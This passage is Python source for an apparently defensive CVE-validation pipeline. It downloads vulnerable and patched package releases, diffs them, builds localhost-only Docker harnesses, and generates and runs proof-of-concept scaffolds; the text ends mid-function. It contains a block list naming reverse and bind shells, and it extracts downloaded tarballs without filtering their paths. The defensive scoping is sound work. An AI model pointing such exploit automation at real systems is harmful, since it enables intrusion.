from __future__ import annotations

import dataclasses
import hashlib
import os
import shutil
import subprocess
import tarfile
from difflib import unified_diff
from pathlib import Path
from urllib.parse import quote
from urllib.request import Request, urlopen
import json
import urllib.error

from cvehunt.fixtures import get_fixture
from cvehunt.models import (
    ChangedFile,
    CveRecord,
    Evidence,
    ExploitOutcome,
    ExploiterArtifact,
    FixArtifact,
    FixStatus,
    HarnessArtifact,
    Judgement,
    NegotiationLog,
    NegotiationRound,
    ProvisionArtifact,
    ResearchFinding,
    SourceBundle,
    TargetHealth,
    ValidationCheck,
    ValidationPlan,
)


class SafetyPolicy:
    """Scope guard for harness-bound proof-of-concept artifacts.

    The policy enforces what the AGENTS.md safety boundary actually requires:
    PoC artifacts target the local harness only and never reach out to
    third-party infrastructure. It does not filter security vocabulary,
    since words like "exploit" and "payload" are unavoidable in legitimate
    harness-bound CVE validation.
    """

    forbidden_phrases = (
        "reverse shell",
        "weaponize",
        "bind shell",
    )

    allowed_hosts = (
        "127.0.0.1",
        "localhost",
        "::1",
    )

    def assert_safe_text(self, text: str) -> None:
        lowered = text.lower()
        matches = [phrase for phrase in self.forbidden_phrases if phrase in lowered]
        if matches:
            raise ValueError(f"unsafe output blocked: {', '.join(matches)}")

    def assert_localhost_scoped(self, text: str) -> None:
        import re

        for match in re.findall(r"https?://([^/\s\"']+)", text):
            host = match.split(":", 1)[0].lower()
            if host not in self.allowed_hosts:
                raise ValueError(
                    f"poc target host outside harness scope: {host}"
                )


class CollectorAgent:
    def collect(self, cve_id: str) -> CveRecord:
        record = get_fixture(cve_id)
        if record is None:
            return CveRecord(
                cve_id=cve_id.upper(),
                name="Unknown",
                summary="No local fixture is available for this CVE.",
                cvss=None,
                disclosed="unknown",
                ecosystem="unknown",
                vulnerable_versions=[],
                patched_versions=[],
            )
        return record


class ResearcherAgent:
    def research(
        self,
        cve: CveRecord,
        artifact_root: Path,
    ) -> tuple[ResearchFinding, SourceBundle]:
        vulnerability_class, impacted_surface, hypothesis, fallback_patch_signal = (
            self._classify_summary(cve.summary)
        )
        sources = self._materialize_sources(cve, artifact_root)
        relevant_patch_signal = self._choose_patch_signal(sources, fallback_patch_signal)
        finding = ResearchFinding(
            impacted_surface=impacted_surface,
            vulnerability_class=vulnerability_class,
            defensive_hypothesis=hypothesis,
            relevant_patch_signal=relevant_patch_signal,
            changed_files=[entry.path for entry in sources.changed_files[:8]],
            research_notes=sources.notes,
        )
        return finding, sources

    def _classify_summary(self, summary: str) -> tuple[str, str, str, str]:
        normalized = summary.lower()
        if "deserialization" in normalized:
            return (
                "unsafe deserialization",
                "request parsing and server function argument materialization",
                (
                    "Inspect vulnerable and patched package releases for newly added "
                    "property-ownership checks and serialization guards before relying "
                    "on fixture-only validation."
                ),
                "Look for newly added own-property validation around metadata lookups.",
            )
        if "interpolation" in normalized:
            return (
                "unsafe interpolation",
                "template or string lookup evaluation",
                (
                    "Inspect the patched release for removed lookup handlers or allowlist "
                    "logic, then confirm the defensive fixture reflects that change."
                ),
                "Look for disabled lookup handlers or stronger interpolation allowlists.",
            )
        if "sql injection" in normalized or "sqli" in normalized:
            return (
                "sql injection",
                "authentication and proxy API key verification query construction",
                (
                    "Inspect vulnerable and patched releases for parameterized query "
                    "handling in the authentication path, then confirm any local fixture "
                    "captures the same input-validation boundary."
                ),
                "Look for caller-supplied values being passed as separate query parameters.",
            )
        return (
            "unknown",
            "unknown",
            "Local source acquisition is required before automated assessment can go further.",
            "No patch signal inferred from the summary alone.",
        )

    def _materialize_sources(self, cve: CveRecord, artifact_root: Path) -> SourceBundle:
        if cve.ecosystem == "npm":
            return self._materialize_registry_sources(
                cve,
                artifact_root,
                fetch_manifest=self._fetch_npm_manifest,
                tarball_extension="tgz",
                package_subdir="package",
            )
        if cve.ecosystem == "pypi":
            return self._materialize_registry_sources(
                cve,
                artifact_root,
                fetch_manifest=self._fetch_pypi_manifest,
                tarball_extension="tar.gz",
                package_subdir=None,
            )
        return SourceBundle(
            status="not_supported",
            ecosystem=cve.ecosystem,
            package=None,
            vulnerable_version=None,
            patched_version=None,
            vulnerable_tarball_url=None,
            patched_tarball_url=None,
            vulnerable_tarball_sha256=None,
            patched_tarball_sha256=None,
            vulnerable_root=None,
            patched_root=None,
            diff_path=None,
            notes=[
                f"Real source acquisition is not implemented for ecosystem {cve.ecosystem}.",
            ],
        )

    def _materialize_registry_sources(
        self,
        cve: CveRecord,
        artifact_root: Path,
        fetch_manifest,
        tarball_extension: str,
        package_subdir: str | None,
    ) -> SourceBundle:
        vulnerable = _parse_version_spec(cve.vulnerable_versions[0]) if cve.vulnerable_versions else None
        patched = _parse_version_spec(cve.patched_versions[0]) if cve.patched_versions else None
        if vulnerable is None or patched is None:
            return SourceBundle(
                status="failed",
                ecosystem=cve.ecosystem,
                package=None,
                vulnerable_version=None,
                patched_version=None,
                vulnerable_tarball_url=None,
                patched_tarball_url=None,
                vulnerable_tarball_sha256=None,
                patched_tarball_sha256=None,
                vulnerable_root=None,
                patched_root=None,
                diff_path=None,
                notes=["Unable to parse vulnerable or patched package coordinates."],
            )

        package, vulnerable_version = vulnerable
        patched_package, patched_version = patched
        if package != patched_package:
            return SourceBundle(
                status="failed",
                ecosystem=cve.ecosystem,
                package=package,
                vulnerable_version=vulnerable_version,
                patched_version=patched_version,
                vulnerable_tarball_url=None,
                patched_tarball_url=None,
                vulnerable_tarball_sha256=None,
                patched_tarball_sha256=None,
                vulnerable_root=None,
                patched_root=None,
                diff_path=None,
                notes=["Vulnerable and patched package coordinates point to different packages."],
            )

        sources_dir = artifact_root / "sources"
        research_dir = artifact_root / "research"
        sources_dir.mkdir(parents=True, exist_ok=True)
        research_dir.mkdir(parents=True, exist_ok=True)
        safe_name = package.replace("/", "__")
        vulnerable_tarball = sources_dir / f"{safe_name}-{vulnerable_version}.{tarball_extension}"
        patched_tarball = sources_dir / f"{safe_name}-{patched_version}.{tarball_extension}"
        vulnerable_root = sources_dir / "vulnerable"
        patched_root = sources_dir / "patched"
        try:
            vulnerable_url = fetch_manifest(package, vulnerable_version)
            patched_url = fetch_manifest(package, patched_version)
            self._download_tarball(vulnerable_url, vulnerable_tarball)
            self._download_tarball(patched_url, patched_tarball)
            if vulnerable_root.exists():
                _remove_tree(vulnerable_root)
            if patched_root.exists():
                _remove_tree(patched_root)
            self._extract_tarball(vulnerable_tarball, vulnerable_root)
            self._extract_tarball(patched_tarball, patched_root)
            vulnerable_pkg_root = self._resolve_package_root(vulnerable_root, package_subdir)
            patched_pkg_root = self._resolve_package_root(patched_root, package_subdir)
            diff_path = research_dir / "source_diff.patch"
            changed_files = self._write_diff(
                vulnerable_pkg_root,
                patched_pkg_root,
                diff_path,
            )
        except Exception as exc:
            return SourceBundle(
                status="failed",
                ecosystem=cve.ecosystem,
                package=package,
                vulnerable_version=vulnerable_version,
                patched_version=patched_version,
                vulnerable_tarball_url=None,
                patched_tarball_url=None,
                vulnerable_tarball_sha256=None,
                patched_tarball_sha256=None,
                vulnerable_root=None,
                patched_root=None,
                diff_path=None,
                notes=[f"Source acquisition failed: {exc}"],
            )

        total_changed = len(changed_files)
        truncated_files = changed_files[:50]
        notes = [
            f"Downloaded published {cve.ecosystem} releases for {package} {vulnerable_version} and {patched_version}.",
            f"Captured a source diff covering {total_changed} changed file(s).",
        ]
        if total_changed > len(truncated_files):
            notes.append(
                f"Reporting only the top {len(truncated_files)} highest-churn files; "
                f"the full diff is in {_relpath(diff_path, artifact_root)}."
            )
        return SourceBundle(
            status="materialized",
            ecosystem=cve.ecosystem,
            package=package,
            vulnerable_version=vulnerable_version,
            patched_version=patched_version,
            vulnerable_tarball_url=vulnerable_url,
            patched_tarball_url=patched_url,
            vulnerable_tarball_sha256=_sha256(vulnerable_tarball),
            patched_tarball_sha256=_sha256(patched_tarball),
            vulnerable_root=_relpath(vulnerable_pkg_root, artifact_root),
            patched_root=_relpath(patched_pkg_root, artifact_root),
            diff_path=_relpath(diff_path, artifact_root),
            changed_files=truncated_files,
            notes=notes,
        )

    def _resolve_package_root(self, extracted_root: Path, package_subdir: str | None) -> Path:
        if package_subdir is not None:
            return extracted_root / package_subdir
        children = [child for child in extracted_root.iterdir() if child.is_dir()]
        if len(children) == 1:
            return children[0]
        return extracted_root

    def _fetch_npm_manifest(self, package: str, version: str) -> str:
        package_ref = quote(package, safe="")
        version_ref = quote(version, safe="")
        with urlopen(
            f"https://registry.npmjs.org/{package_ref}/{version_ref}",
            timeout=30,
        ) as response:
            manifest = json.load(response)
        return str(manifest["dist"]["tarball"])

    def _fetch_pypi_manifest(self, package: str, version: str) -> str:
        package_ref = quote(package, safe="")
        version_ref = quote(version, safe="")
        with urlopen(
            f"https://pypi.org/pypi/{package_ref}/{version_ref}/json",
            timeout=30,
        ) as response:
            manifest = json.load(response)
        urls = manifest.get("urls") or []
        for entry in urls:
            if entry.get("packagetype") == "sdist":
                return str(entry["url"])
        if urls:
            return str(urls[0]["url"])
        raise RuntimeError(f"no distributions listed for {package}=={version}")

    def _download_tarball(self, url: str, dest: Path) -> None:
        with urlopen(url, timeout=60) as response:
            dest.write_bytes(response.read())

    def _extract_tarball(self, tarball: Path, dest: Path) -> None:
        dest.mkdir(parents=True, exist_ok=True)
        with tarfile.open(tarball) as archive:
            archive.extractall(dest)

    def _write_diff(
        self,
        vulnerable_root: Path,
        patched_root: Path,
        diff_path: Path,
    ) -> list[ChangedFile]:
        changed_files: list[ChangedFile] = []
        diff_chunks: list[str] = []
        all_paths = sorted(
            {
                path.relative_to(vulnerable_root).as_posix()
                for path in vulnerable_root.rglob("*")
                if path.is_file()
            }
            | {
                path.relative_to(patched_root).as_posix()
                for path in patched_root.rglob("*")
                if path.is_file()
            }
        )
        for relative in all_paths:
            vulnerable_path = vulnerable_root / relative
            patched_path = patched_root / relative
            vulnerable_lines = _read_lines(vulnerable_path)
            patched_lines = _read_lines(patched_path)
            if vulnerable_lines == patched_lines:
                continue
            diff_lines = list(
                unified_diff(
                    vulnerable_lines,
                    patched_lines,
                    fromfile=f"a/{relative}",
                    tofile=f"b/{relative}",
                )
            )
            additions = sum(
                1
                for line in diff_lines
                if line.startswith("+") and not line.startswith("+++")
            )
            deletions = sum(
                1
                for line in diff_lines
                if line.startswith("-") and not line.startswith("---")
            )
            patch_signal = _detect_patch_signal("".join(diff_lines))
            changed_files.append(
                ChangedFile(
                    path=relative,
                    additions=additions,
                    deletions=deletions,
                    patch_signal=patch_signal,
                )
            )
            diff_chunks.extend(diff_lines)
            diff_chunks.append("\n")
        diff_path.write_text("".join(diff_chunks), encoding="utf-8")
        return sorted(
            changed_files,
            key=lambda item: (item.additions + item.deletions, item.path),
            reverse=True,
        )

    def _choose_patch_signal(self, sources: SourceBundle, fallback: str) -> str:
        for changed_file in sources.changed_files:
            if changed_file.patch_signal:
                return (
                    f"{changed_file.patch_signal} observed in {changed_file.path} "
                    f"({changed_file.additions} additions, {changed_file.deletions} deletions)."
                )
        if sources.changed_files:
            top = sources.changed_files[0]
            return (
                f"Primary diff landed in {top.path} with "
                f"{top.additions} additions and {top.deletions} deletions."
            )
        return fallback


class HarnessBuilderAgent:
    def __init__(self, safety_policy: SafetyPolicy | None = None) -> None:
        self.safety_policy = safety_policy or SafetyPolicy()

    def build(
        self,
        cve: CveRecord,
        finding: ResearchFinding,
        sources: SourceBundle,
        artifact_root: Path,
        base_port: int = 4000,
    ) -> tuple[HarnessArtifact, ValidationPlan]:
        if sources.status != "materialized" or not sources.package:
            plan = ValidationPlan(
                runtime=f"fixture-only validation for {cve.ecosystem}",
                isolation="offline defensive triage only",
                checks=[
                    ValidationCheck(
                        name="patched-vs-vulnerable differential check",
                        purpose="Confirm the local fixture still exposes a vulnerable/patched differential.",
                        safe_method="Run only local synthetic checks. No external targets or proof-of-concept execution.",
                        expected_vulnerable_signal=cve.safe_fixture.get(
                            "vulnerable_signal", "no vulnerable fixture signal available"
                        ),
                        expected_patched_signal=cve.safe_fixture.get(
                            "patched_signal", "no patched fixture signal available"
                        ),
                    )
                ],
                forbidden_outputs=[
                    "exploit scripts",
                    "payloads",
                    "bypass steps",
                    "target-specific instructions",
                ],
            )
            return (
                HarnessArtifact(
                    status="not_supported" if sources.status == "not_supported" else "failed",
                    runtime=plan.runtime,
                    isolation=plan.isolation,
                    workspace=".",
                    notes=sources.notes or ["Real harness materialization was unavailable for this run."],
                ),
                plan,
            )

        harness_dir = artifact_root / "harness"
        harness_dir.mkdir(parents=True, exist_ok=True)
        dockerfile_vulnerable = harness_dir / "Dockerfile.vulnerable"
        dockerfile_patched = harness_dir / "Dockerfile.patched"
        build_script = harness_dir / "build-images.sh"
        readme = harness_dir / "README.md"
        dockerfile_vulnerable.write_text(
            _dockerfile_for_source(
                ecosystem=cve.ecosystem,
                variant="vulnerable",
                source_root=sources.vulnerable_root,
                package=sources.package,
                version=sources.vulnerable_version,
            ),
            encoding="utf-8",
        )
        dockerfile_patched.write_text(
            _dockerfile_for_source(
                ecosystem=cve.ecosystem,
                variant="patched",
                source_root=sources.patched_root,
                package=sources.package,
                version=sources.patched_version,
            ),
            encoding="utf-8",
        )
        build_script.write_text(
            _build_script_for_images(
                cve_id=cve.cve_id,
                package=sources.package,
            ),
            encoding="utf-8",
        )
        build_script.chmod(0o755)
        compose_path = harness_dir / "docker-compose.yml"
        extra_helper_paths: list[Path] = []
        if cve.ecosystem == "pypi" and sources.package == "litellm":
            config_path = harness_dir / "config.yaml"
            db_init_path = harness_dir / "db-init.sql"
            config_path.write_text(_litellm_config_yaml(), encoding="utf-8")
            db_init_path.write_text(_litellm_db_init_sql(), encoding="utf-8")
            extra_helper_paths.extend([config_path, db_init_path])
        shim_emitted = False
        if _shim_supported(finding.vulnerability_class):
            shim_dir = harness_dir / "shim"
            (shim_dir / "vulnerable").mkdir(parents=True, exist_ok=True)
            (shim_dir / "patched").mkdir(parents=True, exist_ok=True)
            vuln_app = shim_dir / "vulnerable" / "app.py"
            patched_app = shim_dir / "patched" / "app.py"
            vuln_dockerfile = shim_dir / "vulnerable" / "Dockerfile"
            patched_dockerfile = shim_dir / "patched" / "Dockerfile"
            shim_readme_path = shim_dir / "README.md"
            vuln_app_source = _shim_app_source(
                finding.vulnerability_class, variant="vulnerable"
            )
            patched_app_source = _shim_app_source(
                finding.vulnerability_class, variant="patched"
            )
            self.safety_policy.assert_safe_text(vuln_app_source)
            self.safety_policy.assert_safe_text(patched_app_source)
            vuln_app.write_text(vuln_app_source, encoding="utf-8")
            patched_app.write_text(patched_app_source, encoding="utf-8")
            vuln_dockerfile.write_text(_shim_dockerfile(), encoding="utf-8")
            patched_dockerfile.write_text(_shim_dockerfile(), encoding="utf-8")
            shim_readme_path.write_text(
                _shim_readme(finding.vulnerability_class), encoding="utf-8"
            )
            extra_helper_paths.extend(
                [
                    vuln_app,
                    patched_app,
                    vuln_dockerfile,
                    patched_dockerfile,
                    shim_readme_path,
                ]
            )
            shim_emitted = True
        compose_path.write_text(
            _compose_for_harness(
                cve_id=cve.cve_id,
                package=sources.package,
                ecosystem=cve.ecosystem,
                include_shim=shim_emitted,
                base_port=base_port,
            ),
            encoding="utf-8",
        )
        readme.write_text(
            _harness_readme(
                cve=cve,
                finding=finding,
                sources=sources,
            ),
            encoding="utf-8",
        )
        plan = ValidationPlan(
            runtime=f"dockerized offline harness for {sources.package}",
            isolation="local package sources and offline fixture validation only",
            checks=[
                ValidationCheck(
                    name="published package pair retrieved",
                    purpose="Verify the vulnerable and patched package releases were downloaded for offline inspection.",
                    safe_method="Inspect local package archives and extracted trees only.",
                    expected_vulnerable_signal=sources.vulnerable_root or "missing vulnerable package tree",
                    expected_patched_signal=sources.patched_root or "missing patched package tree",
                    artifact="sources",
                ),
                ValidationCheck(
                    name="patch diff captured",
                    purpose="Verify that a source diff exists between the vulnerable and patched releases.",
                    safe_method="Review the local unified diff and changed-file summary only.",
                    expected_vulnerable_signal=f"{len(sources.changed_files)} changed file(s)",
                    expected_patched_signal=finding.relevant_patch_signal,
                    artifact=sources.diff_path,
                ),
                ValidationCheck(
                    name="container harness scaffolded",
                    purpose="Verify that isolated Docker build definitions exist for both package variants.",
                    safe_method="Inspect generated Dockerfiles and build helper scripts only.",
                    expected_vulnerable_signal="harness/Dockerfile.vulnerable",
                    expected_patched_signal="harness/Dockerfile.patched",
                    artifact="harness/README.md",
                ),
                ValidationCheck(
                    name="patched-vs-vulnerable differential check",
                    purpose="Confirm the local fixture still exposes a vulnerable/patched differential.",
                    safe_method="Run only local synthetic checks. No external targets or proof-of-concept execution.",
                    expected_vulnerable_signal=cve.safe_fixture.get(
                        "vulnerable_signal", "no vulnerable fixture signal available"
                    ),
                    expected_patched_signal=cve.safe_fixture.get(
                        "patched_signal", "no patched fixture signal available"
                    ),
                ),
            ],
            forbidden_outputs=[
                "exploit scripts",
                "payloads",
                "bypass steps",
                "target-specific instructions",
            ],
        )
        for check in plan.checks:
            self.safety_policy.assert_safe_text(check.purpose)
            self.safety_policy.assert_safe_text(check.safe_method)
        return (
            HarnessArtifact(
                status="built",
                runtime=plan.runtime,
                isolation=f"{plan.isolation}; localhost ports {base_port}/{base_port + 1}",
                workspace=".",
                dockerfiles=[
                    _relpath(dockerfile_vulnerable, artifact_root),
                    _relpath(dockerfile_patched, artifact_root),
                ],
                helper_scripts=[
                    _relpath(build_script, artifact_root),
                    _relpath(compose_path, artifact_root),
                    *[_relpath(path, artifact_root) for path in extra_helper_paths],
                    _relpath(readme, artifact_root),
                ],
                notes=[
                    "Generated Docker build definitions for vulnerable and patched package variants.",
                    "Generated docker-compose orchestration with localhost-only port bindings.",
                ],
            ),
            plan,
        )


class ExploiterAgent:
    def __init__(self, safety_policy: SafetyPolicy | None = None) -> None:
        self.safety_policy = safety_policy or SafetyPolicy()

    def run(
        self,
        cve: CveRecord,
        finding: ResearchFinding,
        harness: HarnessArtifact | None,
        artifact_root: Path,
        base_port: int = 4000,
    ) -> ExploiterArtifact:
        exploiter_dir = artifact_root / "exploiter"
        exploiter_dir.mkdir(parents=True, exist_ok=True)
        readme = exploiter_dir / "README.md"
        if harness is None or harness.status != "built":
            readme.write_text(
                _exploiter_stub_readme(cve),
                encoding="utf-8",
            )
            return ExploiterArtifact(
                implemented=False,
                status="not_supported",
                message="Harness was not materialized, so no PoC scaffold was generated.",
                artifact=_relpath(readme, artifact_root),
                next_step="Extend source acquisition and the harness for this ecosystem first.",
            )

        template = _select_poc_template(finding.vulnerability_class)
        if template is None:
            readme.write_text(
                _exploiter_unsupported_class_readme(cve, finding),
                encoding="utf-8",
            )
            return ExploiterArtifact(
                implemented=False,
                status="stubbed",
                message=(
                    f"No harness PoC template is available for vulnerability class "
                    f"{finding.vulnerability_class!r}."
                ),
                artifact=_relpath(readme, artifact_root),
                next_step="Add a PoC template for this vulnerability class.",
            )

        poc_path = exploiter_dir / "poc.py"
        runner_path = exploiter_dir / "run-poc.sh"
        investigation_path = exploiter_dir / "investigation.md"
        investigation_json_path = exploiter_dir / "investigation.json"
        poc_source = template(cve, base_port=base_port)
        runner_source = _poc_runner_script(cve, base_port=base_port)
        investigation = _poc_investigation_payload(cve, finding, harness, base_port)

        self.safety_policy.assert_safe_text(poc_source)
        self.safety_policy.assert_localhost_scoped(poc_source)

        poc_path.write_text(poc_source, encoding="utf-8")
        runner_path.write_text(runner_source, encoding="utf-8")
        runner_path.chmod(0o755)
        investigation_json_path.write_text(json.dumps(investigation, indent=2), encoding="utf-8")
        investigation_path.write_text(_poc_investigation_markdown(investigation), encoding="utf-8")
        readme.write_text(
            _exploiter_scaffolded_readme(cve, finding),
            encoding="utf-8",
        )

        return ExploiterArtifact(
            implemented=True,
            status="scaffolded",
            message=(
                "Generated a localhost-scoped PoC and orchestration runner for the "
                f"{finding.vulnerability_class} class."
            ),
            artifact=_relpath(readme, artifact_root),
            next_step="Run `bash exploiter/run-poc.sh` from the run directory to execute against the harness.",
            poc_path=_relpath(poc_path, artifact_root),
            runner_path=_relpath(runner_path, artifact_root),
            investigation_path=_relpath(investigation_path, artifact_root),
            investigation_json_path=_relpath(investigation_json_path, artifact_root),
            target_urls={
                "vulnerable": f"http://127.0.0.1:{base_port}",
                "patched": f"http://127.0.0.1:{base_port + 1}",
                "shim_vulnerable": f"http://127.0.0.1:{base_port + 10}",
                "shim_patched": f"http://127.0.0.1:{base_port + 11}",
            },
        )


class HarnessRunnerAgent:
    """Executes the harness orchestration script and parses the PoC outcome.

    The runner only invokes the scripts emitted by HarnessBuilderAgent and
    ExploiterAgent — both of which already passed SafetyPolicy review. It does
    not synthesize new commands or accept caller-controlled targets.
    """

    runner_timeout_seconds: int = 1200

    def __init__(self, safety_policy: SafetyPolicy | None = None) -> None:
        self.safety_policy = safety_policy or SafetyPolicy()

    def run(
        self,
        cve: CveRecord,
        harness: HarnessArtifact | None,
        exploiter: ExploiterArtifact,
        artifact_root: Path,
    ) -> ExploiterArtifact:
        if not (harness and harness.status == "built" and exploiter.implemented):
            return exploiter
        runner_path = artifact_root / "exploiter" / "run-poc.sh"
        if not runner_path.exists():
            return exploiter
        if not _docker_available():
            return dataclasses.replace(
                exploiter,
                next_step=(
                    "Install Docker to run the harness, then re-run with --execute-poc."
                ),
            )
        outcome_path = artifact_root / "exploiter" / "outcome.json"
        if outcome_path.exists():
            outcome_path.unlink()
        log_dir = artifact_root / "exploiter" / "logs"
        log_dir.mkdir(parents=True, exist_ok=True)
        try:
            completed = subprocess.run(
                ["bash", str(runner_path)],
                cwd=str(artifact_root),
                timeout=self.runner_timeout_seconds,
                check=False,
            )
        except subprocess.TimeoutExpired:
            return dataclasses.replace(
                exploiter,
                status="executed",
                message=(
                    f"Harness runner timed out after {self.runner_timeout_seconds}s; "
                    "no PoC outcome was captured."
                ),
                next_step=(
                    "Inspect exploiter/logs/run-poc.log and exploiter/logs/compose.log."
                ),
            )
        outcomes: list[ExploitOutcome] = []
        if outcome_path.exists():
            try:
                payload = json.loads(outcome_path.read_text(encoding="utf-8"))
            except json.JSONDecodeError:
                payload = None
            if isinstance(payload, dict):
                outcomes = _parse_poc_outcome(payload)
        if not outcomes:
            return dataclasses.replace(
                exploiter,
                status="executed",
                message=(
                    f"Harness runner exited with code {completed.returncode} but no "
                    "structured PoC outcome was captured."
                ),
                next_step=(
                    "Inspect exploiter/logs/run-poc.log and exploiter/logs/compose.log."
                ),
            )
        triggered = next((item for item in outcomes if item.variant == "vulnerable" and item.triggered), None)
        blocked = next((item for item in outcomes if item.variant == "patched" and not item.triggered), None)
        shim_triggered = next(
            (item for item in outcomes if item.variant == "shim_vulnerable" and item.triggered),
            None,
        )
        shim_blocked = next(
            (item for item in outcomes if item.variant == "shim_patched" and not item.triggered),
            None,
        )
        if triggered and blocked:
            message = (
                "Harness PoC triggered the vulnerable container and was blocked "
                "by the patched container."
            )
        elif triggered:
            message = (
                "Harness PoC triggered the vulnerable container, but the patched "
                "container did not behave as expected."
            )
        elif blocked:
            message = (
                "Harness PoC was blocked by the patched container, but the "
                "vulnerable container did not exhibit the expected signal."
            )
        elif shim_triggered and shim_blocked:
            message = (
                "Upstream containers showed no differential, but the harness "
                "shim demonstrated the vulnerability class deterministically."
            )
        else:
            message = "Harness PoC ran but produced no decisive vulnerable/patched differential."
        return dataclasses.replace(
            exploiter,
            status="executed",
            message=message,
            outcomes=outcomes,
            next_step="Review exploiter/outcome.json, exploiter/investigation.md, and exploiter/logs/ for raw evidence and next experiments.",
        )


class ProvisionAgent:
    """Health gate for the harness.

    The orchestrator (`exploiter/run-poc.sh`) is responsible for building,
    starting, and tearing down the target containers, and it writes a
    `provision/provision.json` recording per-target servability while the
    stack is up. ProvisionAgent reads that record (or, if absent, performs a
    lightweight best-effort probe of the expected localhost ports with a
    short deadline — it NEVER rebuilds or restarts containers itself). The
    result records whether the vulnerable surface was actually servable;
    the adversarial loop and the Judge may only credit an escalation when it
    was. A `console.log`-and-exit harness is recorded `not_servable`.
    """

    fallback_probe_seconds: int = 2

    def __init__(self, safety_policy: SafetyPolicy | None = None) -> None:
        self.safety_policy = safety_policy or SafetyPolicy()

    def run(
        self,
        cve: CveRecord,
        harness: HarnessArtifact | None,
        finding: ResearchFinding,
        artifact_root: Path,
        base_port: int = 4000,
    ) -> ProvisionArtifact:
        import time

        provision_dir = artifact_root / "provision"
        provision_dir.mkdir(parents=True, exist_ok=True)
        log_path = provision_dir / "provision.log"
        json_path = provision_dir / "provision.json"
        log_lines: list[str] = [f"[provision] {cve.cve_id} class={finding.vulnerability_class}"]

        if harness is None or harness.status != "built":
            note = "Harness was not built; no target to provision."
            log_lines.append(f"[provision] {note}")
            self._write_provision(
                json_path, log_path, log_lines, status="not_executed", note=note, targets=[]
            )
            return ProvisionArtifact(
                status="not_executed",
                note=note,
                log_path=_relpath(log_path, artifact_root),
                json_path=_relpath(json_path, artifact_root),
            )

        # Prefer the orchestrator's own provision record when present.
        if json_path.exists():
            try:
                payload = json.loads(json_path.read_text(encoding="utf-8"))
            except json.JSONDecodeError:
                payload = None
            if isinstance(payload, dict) and isinstance(payload.get("targets"), list):
                targets = [
                    TargetHealth(
                        name=str(t.get("name", "")),
                        url=str(t.get("url", "")),
                        ready=bool(t.get("ready")),
                        servable=bool(t.get("servable")),
                        detail=str(t.get("detail", "")),
                    )
                    for t in payload["targets"]
                ]
                status = str(payload.get("status") or self._status_for(targets))
                note = str(payload.get("note") or self._note_for(targets))
                log_lines.append(f"[provision] read orchestrator record: {status} ({note})")
                self._write_provision_log(log_path, log_lines)
                return ProvisionArtifact(
                    status=status,
                    targets=targets,
                    note=note,
                    log_path=_relpath(log_path, artifact_root),
                    json_path=_relpath(json_path, artifact_root),
                )

        if not _docker_available():
            note = "Docker is not available and no orchestrator provision record exists; provisioning skipped."
            log_lines.append(f"[provision] {note}")
            self._write_provision(
                json_path, log_path, log_lines, status="skipped", note=note, targets=[]
            )
            return ProvisionArtifact(
                status="skipped",
                note=note,
                log_path=_relpath(log_path, artifact_root),
                json_path=_relpath(json_path, artifact_root),
            )

        # Fallback: lightweight best-effort probe of expected ports. No rebuild,
        # no restart — purely observational so a stub `console.log`-and-exit
        # upstream harness is honestly recorded `not_servable`.
        port_specs = self._expected_targets(cve, finding, base_port)
        if not port_specs:
            note = (
                "No servable target surface is available for this class/ecosystem "
                f"({finding.vulnerability_class}/{cve.ecosystem}); the upstream harness "
                "container does not expose a probeable endpoint."
            )
            log_lines.append(f"[provision] {note}")
            self._write_provision(
                json_path, log_path, log_lines, status="not_servable", note=note, targets=[]
            )
            return ProvisionArtifact(
                status="not_servable",
                note=note,
                log_path=_relpath(log_path, artifact_root),
                json_path=_relpath(json_path, artifact_root),
            )
        targets: list[TargetHealth] = []
        for name, port in port_specs:
            ready = self._health_ready(port)
            # Brief re-poll window for freshly-started services.
            for _ in range(self.fallback_probe_seconds):
                if ready:
                    break
                time.sleep(1)
                ready = self._health_ready(port)
            detail = "readiness HTTP 200" if ready else "no readiness response"
            log_lines.append(
                f"[provision] {name} port={port} ready={ready} servable={ready} detail={detail}"
            )
            targets.append(
                TargetHealth(
                    name=name,
                    url=f"http://127.0.0.1:{port}",
                    ready=ready,
                    servable=ready,
                    detail=detail,
                )
            )
        status = self._status_for(targets)
        note = self._note_for(targets)
        log_lines.append(f"[provision] {note}")
        self._write_provision(
            json_path, log_path, log_lines, status=status, note=note, targets=targets
        )
        return ProvisionArtifact(
            status=status,
            targets=targets,
            note=note,
            log_path=_relpath(log_path, artifact_root),
            json_path=_relpath(json_path, artifact_root),
        )

    @staticmethod
    def _expected_targets(cve: CveRecord, finding: ResearchFinding, base_port: int) -> list[tuple[str, int]]:
        # Only the shim (and litellm upstream) exposes /health/readiness on a
        # known localhost port today. The npm react-server-dom-webpack stub
        # does not, which is exactly why it must be recorded not_servable.
        if _shim_supported(finding.vulnerability_class):
            return [
                ("shim-vulnerable", base_port + 10),
                ("shim-patched", base_port + 11),
            ]
        if cve.ecosystem == "pypi" and finding.vulnerability_class == "sql injection":
            return [
                ("vulnerable", base_port),
                ("patched", base_port + 1),
            ]
        return []

    @staticmethod
    def _health_ready(port: int) -> bool:
        status, _ = _http_probe(f"http://127.0.0.1:{port}/health/readiness", timeout=2.0)
        return status == 200

    @staticmethod
    def _status_for(targets: list[TargetHealth]) -> str:
        servable_count = sum(1 for t in targets if t.servable)
        if targets and servable_count == len(targets):
            return "servable"
        if servable_count > 0:
            return "partially_servable"
        return "not_servable"

    @staticmethod
    def _note_for(targets: list[TargetHealth]) -> str:
        servable_count = sum(1 for t in targets if t.servable)
        return f"{servable_count}/{len(targets)} target(s) servable."

    @staticmethod
    def _write_provision(
        json_path: Path,
        log_path: Path,
        log_lines: list[str],
        *,
        status: str,
        note: str,
        targets: list[TargetHealth],
    ) -> None:
        ProvisionAgent._write_provision_log(log_path, log_lines)
        json_path.write_text(
            json.dumps(
                {
                    "status": status,
                    "note": note,
                    "targets": [dataclasses.asdict(target) for target in targets],
                },
                indent=2,
            ),
            encoding="utf-8",
        )

    @staticmethod
    def _write_provision_log(log_path: Path, log_lines: list[str]) -> None:
        log_path.write_text("\n".join(log_lines) + "\n", encoding="utf-8")

    def _health_ready(self, port: int) -> bool:
        status, _ = _http_probe(f"http://127.0.0.1:{port}/health/readiness", timeout=2.0)
        return status == 200

    def _probe_target(
        self, container: str, name: str, port: int, log_lines: list[str]
    ) -> TargetHealth:
        url = f"http://127.0.0.1:{port}/health/readiness"
        ready_status, ready_body = _http_probe(url, timeout=3.0)
        ready = ready_status == 200
        servable = ready
        detail = f"readiness HTTP {ready_status}"
        if ready_status is None:
            detail = f"readiness probe failed: {ready_body}"
            servable = False
        log_lines.append(
            f"[provision] {name} readiness={ready_status} servable={servable} detail={detail}"
        )
        return TargetHealth(
            name=name,
